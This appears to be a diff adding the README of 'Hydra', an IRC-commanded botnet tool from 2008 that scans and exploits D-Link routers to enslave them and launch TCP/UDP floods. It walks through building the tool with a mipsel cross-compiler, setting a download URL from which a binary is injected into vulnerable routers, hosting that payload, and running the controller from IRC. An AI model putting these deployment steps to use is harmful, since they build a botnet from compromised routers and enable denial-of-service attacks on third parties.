@@ -1,0 +1,61 @@
+
+   Hydra - Mass DDOS Tool (scanner/exploiter/attacker)
+  Copyright (C) 2008 esaltato, <esaltato@autistici.org>
+
+  DESCRIPTION:
+  ------------
+  Hydra is a mass-tool commanded by irc that allows scanners and 
+  exploited dlink router for make BOTNET (rx-bot style), 
+  in addition to this, with void you can attack with 
+  tcp/udp flood.
+
+  INSTALL:
+  --------
+  The installation is just a little complicated,
+  but not hard!
+
+  you need to download the source of hydra and
+  the cross-compiler for mipsel, you find these
+  all in hydra homepage.
+
+  hydra-[VERSION].tar.gz / cross_gcc-mipsel.tar.bz2
+
+  $ tar zxvf hydra* && sudo tar xjvf cross_gcc*
+   [..]
+  $ cd hydra-[VERSION]
+  $ vi include/hydra_conf.h
+
+     * NOW CONFIGURE IT!
+
+     * WARNING IMPORTANT:
+      --
+      /* mipsel url reference */
+      #define hydra_url    "http://your_fucking_url/youfucktard"
+      /* mipsel precompiled binary tag */
+      #define hydra_tag    "hydra_mipsel_bin_2008.1"
+      --
+      http://your_fucking_url/youfucktard/hydra_mipsel_bin_2008.1
+      --
+
+     * set the link of your compiled mipsel-binary
+     * that's needed by hydra to inject in vulnerables routers.
+
+  $ make x86 && make mipsel
+
+     * now upload your mipsel-bin in your like ftp/http server
+     * NOTE: check if your binary name is the same of hydra_tag
+     *       in include/hydra_conf.h !
+
+  $ ./hydra_x86_bin_2008.1
+  $
+    * now go to your irc server and manage your hydra!
+
+  BUGS:
+  -----
+  if you find bugs (which is quite likely), please submit them to
+  <esaltato@autistici.org> with specific information, such as your
+  command-line, the nature of the bug and other.
+
+  COPYRIGHT:
+  ----------
+  Hydra is Copyright (C) 2008 esaltato <esaltato@autistici.org>.
